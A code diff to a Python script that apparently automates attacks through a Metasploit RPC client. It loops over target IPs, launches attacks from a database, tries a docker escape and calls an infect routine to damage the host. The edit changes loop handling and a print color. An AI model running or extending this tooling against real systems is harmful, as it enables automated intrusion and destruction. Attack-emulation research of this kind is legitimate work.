@@ -49,13 +49,13 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
     atk_sess=None
 
     compromised_machines={attacker_ip}
-    uncompromised_machines=set()
+    uncompromised_machines=machines
 
     mc=MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
 
-    while(machines):
+    while uncompromised_machines:
 
-        target_ip=machines.pop(0)
+        target_ip=uncompromised_machines.pop(0)
         print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
 
         attack=list(Attack_DB.attack_dict)
@@ -113,6 +113,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             attack_instr=Attack_DB.attack_dict[ra].instruction.format(target_ip,attacker_ip,LPORT=LPORT)
             attack_type=Attack_DB.attack_dict[ra].attack_type
             attack_wait=Attack_DB.attack_dict[ra].wait_time
+            
             print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")
 
             if(attack_name=="tomcat_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="tomcat_server"):
@@ -162,7 +163,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
                             #print(escape)
-                            print(f"{C.COL_YELLOW} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
+                            print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
                             mc.infect()
                         else:
                             print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
